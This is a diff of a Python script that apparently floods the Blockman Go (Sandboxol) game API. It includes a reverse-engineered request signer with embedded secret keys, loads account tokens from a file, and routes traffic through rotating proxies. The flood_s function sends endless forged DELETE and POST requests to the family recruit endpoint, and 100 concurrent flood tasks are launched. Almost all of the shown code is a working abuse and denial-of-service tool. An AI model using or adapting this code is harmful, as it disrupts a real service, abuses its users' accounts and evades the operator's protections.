@@ -17,7 +17,7 @@ from Crypto.Cipher import AES, PKCS1_v1_5
 from Crypto.Util.Padding import pad
 from Crypto.PublicKey import RSA
 
-PROXY_WORK = ["socks5://127.0.0.1:10808"]
+PROXY_WORK = []
 
 def get_xsign(path, nonce, time, params, android_id):
     md5 = hashlib.md5(f"6aDtpIdzQdgGwrpP6HzuPA{path}{nonce}{time}{params}9EuDKGtoWAOWoQH1cRng-d5ihNN60hkGLaRiaZTk-6s".encode()).hexdigest()
@@ -178,19 +178,24 @@ async def main():
     ) as session:
         asyncio.create_task(update_endpoints(session))
         asyncio.create_task(cdn(session))
-        asyncio.create_task(vless(session))
-       # await asyncio.sleep(5)
-       # lock = asyncio.Lock()
-     #   asyncio.create_task(create_accounts(session, lock))
-      #  await asyncio.sleep(15)
-     #   asyncio.create_task(flood_s(session, lock))
+        asyncio.create_task(proxies(session))
+        while True:
+            if not PROXY_WORK:
+                await asyncio.sleep(0.1)
+                continue
+            break
+        lock = asyncio.Lock()
+        #asyncio.create_task(create_accounts(session, lock))
+        asyncio.create_task(flood_s(session, lock))
         await asyncio.sleep(9999999999999999999999999999999999999999)
 
-ACCOUNTS = []
+with open("abee.txt", "r") as f:
+    ACCOUNTS = f.read()
+    ACCOUNTS = ACCOUNTS.split("\n")
 
 async def cr(lock):
     while True:
-        async with aiohttp.ClientSession(connector=ProxyConnector.from_url(random.choice(PROXY_WORK), ssl=False, rdns=True, limit=0)) as session:
+        async with aiohttp.ClientSession(connector=ProxyConnector.from_url(random.choice(PROXY_WORK), ssl=False, limit=0)) as session:
             android_id = "".join(random.choice("0123456789abcdef") for _ in range(16))
             nonce = str(uuid.uuid4())
             query = get_enc_query(android_id, nonce)
@@ -352,121 +357,122 @@ async def flood_s(session, lock):
         while True:
             if not ACCOUNTS:
                 continue
-            account = random.choice(ACCOUNTS)
-            user_id, token, android_id, register_time, device_register_time = account.split(":")
-            nonce = str(uuid.uuid4())
-            xtime = str(int(time.time()))
-            xsign = get_xsign("/friend/api/v1/family/recruit", nonce, xtime, "", android_id)
-            region = random.choice(
-                [
-                    "zh_CN",
-                    "en_US",
-                    "de_DE",
-                    "es_ES",
-                    "fr_FR",
-                    "hi_IN",
-                    "in_ID",
-                    "it_IT",
-                    "ja_JP",
-                    "ko_KR",
-                    "pl_PL",
-                    "pt_PT",
-                    "ru_RU",
-                    "th_TH",
-                    "tr_TR",
-                    "uk_UA",
-                    "vi_VN"
-                ]
-            )
-            try:
-                async with session.delete(
-                    f"https://{random.choice(DATA_CENTERS)}/friend/api/v1/family/recruit",
-                    timeout=2,
-                    headers={
-                        "userId": user_id,
-                        "packageName": "official",
-                        "packageNameFull": "com.sandboxol.blockymods",
-                        "androidVersion": "30",
-                        "OS": "android",
-                        "appType": "android",
-                        "appLanguage": region[:2],
-                        "appVersion": "5421",
-                        "appVersionName": "2.125.1",
-                        "channel": "sandbox",
-                        "uid_register_ts": register_time,
-                        "device_register_ts": device_register_time,
-                        "eventType": "app",
-                        "userDeviceId": android_id,
-                        "userLanguage": region,
-                        "region": "RU",
-                        "clientType": "client",
-                        "env": "prd",
-                        "package_name_en": "com.sandboxol.blockymods",
-                        "md5": "c0c2f5baf2e9b4a063fc0cdf099960de",
-                        "X-ApiKey": "6aDtpIdzQdgGwrpP6HzuPA",
-                        "X-Nonce": nonce,
-                        "X-Time": xtime,
-                        "X-Sign": xsign,
-                        "X-UrlPath": "/friend/api/v1/family/recruit",
-                        "Access-Token": get_enc_token(token + nonce),
-                        "Host": "gw.sandboxol.com",
-                        "Connection": "Keep-Alive",
-                        "Accept-Encoding": "gzip",
-                        "User-Agent": "okhttp/4.10.0"
-                    }
-                ) as response:
-                    pass
-
+            async with aiohttp.ClientSession(connector=ProxyConnector.from_url(random.choice(PROXY_WORK), ssl=False, limit=0)) as session:
+                account = random.choice(ACCOUNTS)
+                user_id, token, android_id, register_time, device_register_time = account.split(":")
                 nonce = str(uuid.uuid4())
                 xtime = str(int(time.time()))
-                a = "{"
-                b = "}"
-                aa = random.choice(["1", "2", "3", "4"])
-                bb = random.choice(["1", "2", "3", "4"])
-                body_string = f'{{"age":0,"memberName":"Старший брат","memberType":{aa},"msg":"","ownerName":"Старший брат","ownerType":{bb}}}'
-                xsign = get_xsign("/friend/api/v1/family/recruit", nonce, xtime, body_string, android_id)
-                async with session.post(
-                    f"https://{random.choice(DATA_CENTERS)}/friend/api/v1/family/recruit",
-                    data=body_string.encode(),
-                    timeout=2,
-                    headers={
-                        "language": region,
-                        "userId": user_id,
-                        "packageName": "official",
-                        "packageNameFull": "com.sandboxol.blockymods",
-                        "androidVersion": "30",
-                        "OS": "android",
-                        "appType": "android",
-                        "appLanguage": region[:2],
-                        "appVersion": "5421",
-                        "appVersionName": "2.125.1",
-                        "channel": "sandbox",
-                        "uid_register_ts": register_time,
-                        "device_register_ts": device_register_time,
-                        "eventType": "app",
-                        "userDeviceId": android_id,
-                        "userLanguage": region,
-                        "region": "RU",
-                        "clientType": "client",
-                        "env": "prd",
-                        "package_name_en": "com.sandboxol.blockymods",
-                        "md5": "c0c2f5baf2e9b4a063fc0cdf099960de",
-                        "X-ApiKey": "6aDtpIdzQdgGwrpP6HzuPA",
-                        "X-Nonce": nonce,
-                        "X-Time": xtime,
-                        "X-Sign": xsign,
-                        "X-UrlPath": "/friend/api/v1/family/recruit",
-                        "Access-Token": get_enc_token(token + nonce),
-                        "Content-Type": "application/json; charset=UTF-8",
-                        "Host": "gw.sandboxol.com",
-                        "Connection": "Keep-Alive",
-                        "Accept-Encoding": "gzip",
-                        "User-Agent": "okhttp/4.10.0"
-                    }
-                ) as response:
-                    pass
-            except:
-                continue
+                xsign = get_xsign("/friend/api/v1/family/recruit", nonce, xtime, "", android_id)
+                region = random.choice(
+                    [
+                        "zh_CN",
+                        "en_US",
+                        "de_DE",
+                        "es_ES",
+                        "fr_FR",
+                        "hi_IN",
+                        "in_ID",
+                        "it_IT",
+                        "ja_JP",
+                        "ko_KR",
+                        "pl_PL",
+                        "pt_PT",
+                        "ru_RU",
+                        "th_TH",
+                        "tr_TR",
+                        "uk_UA",
+                        "vi_VN"
+                    ]
+                )
+                try:
+                    async with session.delete(
+                        f"http://{random.choice(DATA_CENTERS)}/friend/api/v1/family/recruit",
+                        timeout=2,
+                        headers={
+                            "userId": user_id,
+                            "packageName": "official",
+                            "packageNameFull": "com.sandboxol.blockymods",
+                            "androidVersion": "30",
+                            "OS": "android",
+                            "appType": "android",
+                            "appLanguage": region[:2],
+                            "appVersion": "5421",
+                            "appVersionName": "2.125.1",
+                            "channel": "sandbox",
+                            "uid_register_ts": register_time,
+                            "device_register_ts": device_register_time,
+                            "eventType": "app",
+                            "userDeviceId": android_id,
+                            "userLanguage": region,
+                            "region": "RU",
+                            "clientType": "client",
+                            "env": "prd",
+                            "package_name_en": "com.sandboxol.blockymods",
+                            "md5": "c0c2f5baf2e9b4a063fc0cdf099960de",
+                            "X-ApiKey": "6aDtpIdzQdgGwrpP6HzuPA",
+                            "X-Nonce": nonce,
+                            "X-Time": xtime,
+                            "X-Sign": xsign,
+                            "X-UrlPath": "/friend/api/v1/family/recruit",
+                            "Access-Token": get_enc_token(token + nonce),
+                            "Host": "gw.sandboxol.com",
+                            "Connection": "Keep-Alive",
+                            "Accept-Encoding": "gzip",
+                            "User-Agent": "okhttp/4.10.0"
+                        }
+                    ) as response:
+                        pass
+
+                    nonce = str(uuid.uuid4())
+                    xtime = str(int(time.time()))
+                    a = "{"
+                    b = "}"
+                    aa = random.choice(["1", "2", "3", "4"])
+                    bb = random.choice(["1", "2", "3", "4"])
+                    body_string = f'{{"age":0,"memberName":"Старший брат","memberType":{aa},"msg":"","ownerName":"Старший брат","ownerType":{bb}}}'
+                    xsign = get_xsign("/friend/api/v1/family/recruit", nonce, xtime, body_string, android_id)
+                    async with session.post(
+                        f"http://{random.choice(DATA_CENTERS)}/friend/api/v1/family/recruit",
+                        data=body_string.encode(),
+                        timeout=2,
+                        headers={
+                            "language": region,
+                            "userId": user_id,
+                            "packageName": "official",
+                            "packageNameFull": "com.sandboxol.blockymods",
+                            "androidVersion": "30",
+                            "OS": "android",
+                            "appType": "android",
+                            "appLanguage": region[:2],
+                            "appVersion": "5421",
+                            "appVersionName": "2.125.1",
+                            "channel": "sandbox",
+                            "uid_register_ts": register_time,
+                            "device_register_ts": device_register_time,
+                            "eventType": "app",
+                            "userDeviceId": android_id,
+                            "userLanguage": region,
+                            "region": "RU",
+                            "clientType": "client",
+                            "env": "prd",
+                            "package_name_en": "com.sandboxol.blockymods",
+                            "md5": "c0c2f5baf2e9b4a063fc0cdf099960de",
+                            "X-ApiKey": "6aDtpIdzQdgGwrpP6HzuPA",
+                            "X-Nonce": nonce,
+                            "X-Time": xtime,
+                            "X-Sign": xsign,
+                            "X-UrlPath": "/friend/api/v1/family/recruit",
+                            "Access-Token": get_enc_token(token + nonce),
+                            "Content-Type": "application/json; charset=UTF-8",
+                            "Host": "gw.sandboxol.com",
+                            "Connection": "Keep-Alive",
+                            "Accept-Encoding": "gzip",
+                            "User-Agent": "okhttp/4.10.0"
+                        }
+                    ) as response:
+                        pass
+                except:
+                    continue
 
     tasks = [asyncio.create_task(flood_k(session)) for _ in range(100)]
     await asyncio.gather(*tasks)
